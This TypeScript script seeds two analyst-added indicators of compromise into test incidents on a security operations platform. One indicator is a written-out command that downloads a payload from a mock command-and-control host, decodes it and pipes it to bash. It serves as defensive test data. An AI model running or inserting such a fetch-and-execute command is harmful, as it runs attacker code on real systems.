/**
 * One-off analyst enrichment for the two MEDIUM TC incidents whose primary
 * containment action needs evidence the raw alert didn't carry as a linked IOC:
 *   - Phishing  -> ACT-QUARANTINE-EMAIL needs an EMAIL_MESSAGE IOC (the message)
 *   - Suspicious -> ACT-KILL-PROCESS needs a COMMAND_LINE IOC
 * A SOC analyst adds them through the real manual-IOC path (CreateIocUseCase,
 * origin MANUAL), which the validator accepts as a targetable, analyst-added IOC.
 *
 *   npx ts-node --transpile-only scripts/enrich-tc-medium.ts
 */
import "dotenv/config";
import { PrismaClient } from "@prisma/client";
import { PrismaInvestigationRepository } from "../src/infrastructure/database/postgres/repositories/InvestigationRepository.prisma";
import { AuditLogger } from "../src/infrastructure/database/postgres/repositories/AuditLogger";
import { CreateIocUseCase } from "../src/application/investigation/use-cases/CreateIoc.usecase";

const TENANT = "00000000-0000-0000-0000-000000000001";
const ANALYST = "tc-flow-soc";
// rule -> manual IOC the analyst adds from the alert's own content
const ENRICH: Record<string, { iocType: string; iocValue: string }> = {
  "100310": { iocType: "EMAIL", iocValue: "it-support@vigix-mock-phish.net" },
  "100330": { iocType: "COMMAND", iocValue: "curl -s http://vigix-mock-c2.net/x | base64 -d | bash" },
};

(async () => {
  const prisma = new PrismaClient();
  const investigations = new PrismaInvestigationRepository(prisma);
  const createIoc = new CreateIocUseCase(investigations, new AuditLogger(prisma));

  for (const [rule, ioc] of Object.entries(ENRICH)) {
    const inc = await prisma.incident.findFirst({ where: { alert: { rawPayload: { path: ["rule", "id"], equals: rule } } }, orderBy: { openedAt: "desc" } });
    if (!inc) { console.log(`rule ${rule}: no incident`); continue; }
    const inv = await prisma.investigation.findFirst({ where: { incidentId: inc.id }, orderBy: { investigationNumber: "asc" } });
    if (!inv) { console.log(`rule ${rule}: no investigation`); continue; }
    const r = await createIoc.execute({ tenantId: TENANT, investigationId: inv.id, createdBy: ANALYST, body: { iocType: ioc.iocType, iocValue: ioc.iocValue, source: "analyst enrichment (from alert content)" } as never });
    const ok = r.isSuccess || (r as any).error?.code === "DUPLICATE_IOC" || (r as any).error === "DUPLICATE_IOC";
    console.log(`rule ${rule}: add ${ioc.iocType}="${ioc.iocValue}" -> ${r.isSuccess ? "created" : ok ? "already present" : "FAIL " + JSON.stringify((r as any).error)}`);
  }
  await prisma.$disconnect();
})().catch((e) => { console.error("crashed:", String(e?.stack ?? e).slice(0, 500)); process.exit(2); });
